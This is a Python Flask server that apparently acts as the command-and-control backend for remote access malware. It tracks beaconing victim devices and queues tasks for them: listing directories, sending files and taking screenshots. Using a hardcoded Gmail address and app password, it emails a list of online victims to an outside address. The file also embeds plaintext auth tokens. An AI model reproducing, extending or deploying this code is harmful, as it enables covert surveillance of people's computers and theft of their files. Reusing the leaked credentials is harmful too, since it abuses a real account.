from flask import Flask, jsonify, request
import time
import yagmail
import os
EMAIL_USER = "familyphotosparity002@gmail.com"
EMAIL_PASS = "vsmm hbqg romf phiz"
SEND_TO = "shreyasbkg1@gmail.com"
client_auth_token = "f9&Yz#KqLw^3uB0*"
controller_auth_token = "@8rP$eM1^sV!dH2#"
yag = yagmail.SMTP(EMAIL_USER, EMAIL_PASS)
app = Flask(__name__)
device_names = []
device_timeStamps = []
task_arr = []
file_path = []
temp = 0


@app.route('/get_data', methods=['POST'])
def get_data():
    data = request.get_json()
    if data["token"] != controller_auth_token:
        return "Unauthorized", 401
    print("Received data from client:", data)
    return jsonify({"status": "received", "data": data})


#used by client to log username and time
@app.route('/get_username', methods=['POST'])
def get_username():
    data = request.get_json()
    if data["token"] != client_auth_token:
        return "Unauthorized", 401
    global device_names
    global task_arr 
    global file_path 
    print(f"Username received: {data['username']}")
    print(f"Before append, device_names: {device_names}")
    if data["username"] not in device_names:
        device_names.append(data["username"])
        device_timeStamps.append(data["timeStamp"])
        task_arr.append("idle")
        file_path.append("null")
    device_timeStamps[device_names.index(data["username"])] = float(data["timeStamp"])
    print(device_names)
    print(device_timeStamps)
    return jsonify({"status": "USername Sent","task":task_arr[device_names.index(data["username"])],"path":file_path[device_names.index(data["username"])]})


@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    if data["token"] != client_auth_token:
        return "Unauthorized", 401
    global device_names
    global task_arr 
    global file_path 
    task_arr[device_names.index(data["username"])] = "idle"
    file_path[device_names.index(data["username"])] = "null"
    return jsonify({"status": "done"})




    
    

# used by controller
@app.route('/get_online_details', methods=['POST'])
def get_online_details():
    data = request.get_json()
    if data["token"] != controller_auth_token:
        return "Unauthorized", 401
    global device_names
    global device_timeStamps
    arr = []
    for i in range(len(device_names)):
        try:
            if time.time() - device_timeStamps[i] <= 120:
                arr.append(device_names[i])
        except Exception as e:
            print(f"Error checking timestamp for {device_names[i]}: {e}")
    if arr:
        try:
            body = "\n".join(arr)
            yag.send(SEND_TO, "online details current", body)
            return jsonify({"status": "List sent", "online": arr})
        except Exception as e:
            print(f"Error sending email: {e}")
            return jsonify({"status": "Error sending list"})
    else:
        return jsonify({"status": "Nobody Online"})

    

#method for controller to set path for viewing    
@app.route('/read_dir', methods=['POST'])
def read_dir():
    data = request.get_json()
    if data["token"] != controller_auth_token:
        return "Unauthorized", 401
    global device_names
    global device_timeStamps
    global task_arr
    global file_path
    try:
        if time.time() - device_timeStamps[device_names.index(data["username"])] >= 120:
            return jsonify({"status":"current user not online"})
        else:
            task_arr[device_names.index(data["username"])] = "read_dir"
            file_path[device_names.index(data["username"])] = data["path"]
            return jsonify({"status":"passed command"})
    except Exception as e:
        return jsonify({"status" : "User not found"})
    

@app.route('/send_file', methods=['POST'])
def send_file():
    data = request.get_json()
    if data["token"] != controller_auth_token:
        return "Unauthorized", 401
    global device_names
    global device_timeStamps
    global task_arr
    global file_path
    try:
        if time.time() - device_timeStamps[device_names.index(data["username"])] >= 120:
            return jsonify({"status":"current user not online"})
        else:
            task_arr[device_names.index(data["username"])] = "send_file"
            file_path[device_names.index(data["username"])] = data["path"]
            return jsonify({"status":"passed command"})
    except Exception as e:
        return jsonify({"status" : "User not found"})
    

@app.route('/screenshot', methods=['POST'])
def screenshot():
    data = request.get_json()
    if data["token"] != controller_auth_token:
        return "Unauthorized", 401
    global device_names
    global device_timeStamps
    global task_arr
    global file_path
    try:
        if time.time() - device_timeStamps[device_names.index(data["username"])] >= 120:
            return jsonify({"status":"current user not online"})
        else:
            task_arr[device_names.index(data["username"])] = "screenshot"
            file_path[device_names.index(data["username"])] = "null"
            return jsonify({"status":"passed command"})
    except Exception as e:
        return jsonify({"status" : "User not found"})
    



@app.route('/ping', methods=['GET'])
def ping():
    global temp
    global device_names 
    global device_timeStamps 
    global task_arr 
    global file_path 
    temp += 1
    if temp == 12:
        temp = 0
        device_names.clear()
        device_timeStamps.clear()
        task_arr.clear()
        file_path.clear()
    return "pong", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
